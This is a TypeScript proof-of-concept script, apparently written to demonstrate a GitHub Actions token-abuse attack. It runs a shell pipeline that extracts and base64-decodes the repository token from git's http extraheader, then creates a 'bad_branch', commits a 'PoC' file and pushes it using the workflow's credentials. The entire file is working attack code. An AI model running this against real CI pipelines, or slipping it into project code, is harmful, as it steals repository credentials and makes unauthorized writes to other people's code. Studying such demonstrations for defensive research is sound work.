const subProcess = require('child_process');

const main = (): void => {
  subProcess.exec("git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\\1/p' | base64 -d | sed -nE 's/.*:(.*)/\\1/p'", (err: any, stdout: any, stderr: any) => {
    if (err) {
      console.error(err);
      process.exit(1);
    } else {
      const token: string = stdout.toString();
      subProcess.exec(`git config --global user.email "you@example.com"; git config --global user.name "Your Name"; git checkout -b bad_branch; echo "hello" > poc.txt; git add poc.txt; git commit -m "PoC"; git push origin bad_branch`, (err: any, stdout: any, stderr: any) => {     
      });
    }
  })
};

if (require.main === module) {
  main();
}

export default main;


